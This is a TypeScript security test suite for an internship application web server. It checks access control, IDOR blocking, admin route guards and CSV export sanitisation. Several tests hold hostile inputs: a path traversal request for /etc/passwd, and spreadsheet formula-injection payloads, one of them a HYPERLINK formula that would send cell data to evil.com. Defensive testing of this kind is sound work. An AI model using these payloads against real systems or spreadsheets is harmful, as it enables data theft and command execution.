import http from 'http';
import jwt from 'jsonwebtoken';
import app from '../src/index.js';
import { ExportService } from '../src/services/exportService.js';
import { ENV } from '../src/config/env.js';
import { ApplicationStatus } from '@prisma/client';

async function runSecurityAuditTests() {
  console.log('🛡️ ======================================================== 🛡️');
  console.log('   ALWAR POLICE INTERNSHIP 2026 - SECURITY VERIFICATION SUITE   ');
  console.log('🛡️ ======================================================== 🛡️\n');

  // Start test server on random free port
  const server = http.createServer(app);
  await new Promise<void>((resolve) => server.listen(0, resolve));
  const port = (server.address() as any).port;
  const baseUrl = `http://127.0.0.1:${port}`;

  let passedTests = 0;
  let totalTests = 0;

  function assertTest(name: string, condition: boolean, detail?: string) {
    totalTests++;
    if (condition) {
      passedTests++;
      console.log(`✅ [PASS] Test ${totalTests}: ${name}`);
      if (detail) console.log(`   └─ ${detail}`);
    } else {
      console.error(`❌ [FAIL] Test ${totalTests}: ${name}`);
      if (detail) console.error(`   └─ ${detail}`);
    }
  }

  try {
    // TEST 1: Unauthenticated GET application profile (IDOR prevention)
    {
      const res = await fetch(`${baseUrl}/api/applications/APCSIP2026-000001`);
      const body = await res.json();
      assertTest(
        'Unauthenticated candidate profile access is blocked (IDOR Prevention)',
        res.status === 403,
        `Status: ${res.status}, Response: ${JSON.stringify(body)}`
      );
    }

    // TEST 2: Unauthenticated GET resume (Resume IDOR prevention)
    {
      const res = await fetch(`${baseUrl}/api/applications/resume/resume_1710000000_sample.pdf`);
      const body = await res.json();
      assertTest(
        'Unauthenticated resume download/view is blocked with 401 Unauthorized',
        res.status === 401,
        `Status: ${res.status}, Response: ${JSON.stringify(body)}`
      );
    }

    // TEST 3: Unauthenticated GET registration slip (Slip IDOR prevention)
    {
      const res = await fetch(`${baseUrl}/api/applications/APCSIP2026-000001/registration-slip`);
      const body = await res.json();
      assertTest(
        'Unauthenticated registration slip PDF download is blocked with 403 Forbidden',
        res.status === 403,
        `Status: ${res.status}, Response: ${JSON.stringify(body)}`
      );
    }

    // TEST 4: Student A token attempting to access Student B application profile (BOLA / IDOR)
    {
      const tokenA = jwt.sign(
        { applicationId: 'APCSIP2026-000001', id: 'uuid-student-a', type: 'slip_access' },
        ENV.AUTH_SECRET,
        { expiresIn: '1h' }
      );

      const res = await fetch(`${baseUrl}/api/applications/APCSIP2026-000002`, {
        headers: { 'x-slip-token': tokenA },
      });
      const body = await res.json();

      assertTest(
        'Student A token accessing Student B application is forbidden (Cross-Student IDOR Blocked)',
        res.status === 403,
        `Status: ${res.status}, Response: ${JSON.stringify(body)}`
      );
    }

    // TEST 5: Student A token attempting to download Student B registration slip
    {
      const tokenA = jwt.sign(
        { applicationId: 'APCSIP2026-000001', id: 'uuid-student-a', type: 'slip_access' },
        ENV.AUTH_SECRET,
        { expiresIn: '1h' }
      );

      const res = await fetch(`${baseUrl}/api/applications/APCSIP2026-000002/registration-slip?token=${tokenA}`);
      const body = await res.json();

      assertTest(
        'Student A token downloading Student B registration slip is forbidden with 403',
        res.status === 403,
        `Status: ${res.status}, Response: ${JSON.stringify(body)}`
      );
    }

    // TEST 6: Path Traversal defense on resume identifier
    {
      const res = await fetch(`${baseUrl}/api/applications/resume/..%2F..%2F..%2Fetc%2Fpasswd`);
      assertTest(
        'Path traversal attempt on resume stream is rejected with 401 Unauthorized',
        res.status === 401,
        `Status: ${res.status}`
      );
    }

    // TEST 7: CSV Formula Injection sanitization
    {
      const mockAppWithMaliciousPayload: any = {
        id: 'test-uuid-sec',
        applicationId: 'APCSIP2026-999999',
        fullName: '=cmd|"/C calc"!A0',
        mobile: '+919876543210',
        email: '@malicious.com',
        course: 'BCA',
        year: 'YEAR_2',
        universityName: '-DDE("cmd";"calc";"")',
        skills: ['Network Security', '+SUM(1,2)'],
        customSkills: ['@leak_data'],
        motivation: '=HYPERLINK("http://evil.com?leak="&A1,"Click")',
        resumeFilename: 'resume.pdf',
        resumeUrl: 'data:application/pdf;base64,AAA=',
        resumeMimeType: 'application/pdf',
        resumeSize: 1024,
        status: ApplicationStatus.SUBMITTED,
        statusRemarks: '+StatusRemark',
        ipAddress: '127.0.0.1',
        createdAt: new Date(),
        updatedAt: new Date(),
      };

      const csvBuffer = ExportService.generateCSV([mockAppWithMaliciousPayload]);
      const csvString = csvBuffer.toString('utf-8');

      const containsRawFormula = csvString.includes('\"=cmd|') || csvString.includes('\"=HYPERLINK');
      const containsEscapedFormula = csvString.includes(`"'=cmd|`) || csvString.includes(`"'=HYPERLINK`);

      assertTest(
        'Spreadsheet formula injection characters (=, +, -, @) are safely neutralized with apostrophe in CSV/XLSX export',
        !containsRawFormula && containsEscapedFormula,
        `Escaped check: containsRawFormula=${containsRawFormula}, containsEscapedFormula=${containsEscapedFormula}`
      );
    }

    // TEST 8: Public QR Verification data minimization
    {
      const res = await fetch(`${baseUrl}/api/verify/APCSIP2026-000001`);
      if (res.status === 200) {
        const body = (await res.json()).data;
        const leaksSensitivePII =
          body.email !== undefined ||
          body.mobile !== undefined ||
          body.motivation !== undefined ||
          body.resumeFilename !== undefined ||
          body.resumeUrl !== undefined;

        assertTest(
          'Public verification endpoint exposes ONLY minimal safe fields (NO email, mobile, motivation, resume)',
          !leaksSensitivePII && body.verified === true && body.applicationId !== undefined,
          `Verification payload fields: ${Object.keys(body).join(', ')}`
        );
      } else {
        assertTest(
          'Public verification handles unknown or valid ID safely without leaking private errors',
          res.status === 404 || res.status === 200,
          `Status: ${res.status}`
        );
      }
    }

    // TEST 9: Unauthenticated attempt on Protected Admin Endpoints
    {
      const res = await fetch(`${baseUrl}/api/admin/applications`);
      const body = await res.json();
      assertTest(
        'Unauthenticated request to Admin APIs returns 401 Unauthorized',
        res.status === 401,
        `Status: ${res.status}, Message: ${body?.message}`
      );
    }

    // TEST 10: Unauthenticated attempt on Admin Dashboard Stats
    {
      const res = await fetch(`${baseUrl}/api/admin/dashboard/stats`);
      const body = await res.json();
      assertTest(
        'Unauthenticated request to Admin Stats returns 401 Unauthorized',
        res.status === 401,
        `Status: ${res.status}, Message: ${body?.message}`
      );
    }

    // TEST 11: Unauthenticated attempt on Admin Export API
    {
      const res = await fetch(`${baseUrl}/api/admin/export`);
      assertTest(
        'Unauthenticated request to Admin Export returns 401 Unauthorized',
        res.status === 401,
        `Status: ${res.status}`
      );
    }

    // TEST 12: Admin Auth Bearer Token Access
    {
      const adminToken = jwt.sign(
        { id: 'admin-test-id', email: ENV.ADMIN_EMAIL, name: 'Admin', role: 'SUPER_ADMIN' },
        ENV.AUTH_SECRET,
        { expiresIn: '1h' }
      );

      const res = await fetch(`${baseUrl}/api/admin/me`, {
        headers: { Authorization: `Bearer ${adminToken}` },
      });
      const body = await res.json();

      assertTest(
        'Authenticated Admin token successfully passes admin route guard',
        res.status === 200 && body.data?.admin?.email === ENV.ADMIN_EMAIL,
        `Status: ${res.status}, Admin Email: ${body.data?.admin?.email}`
      );
    }
  } finally {
    server.close();
  }

  console.log('\n========================================================');
  console.log(`SUMMARY: ${passedTests}/${totalTests} Security Verification Tests Passed.`);
  console.log('========================================================\n');

  if (passedTests === totalTests) {
    process.exit(0);
  } else {
    process.exit(1);
  }
}

runSecurityAuditTests().catch((err) => {
  console.error('Fatal test execution error:', err);
  process.exit(1);
});
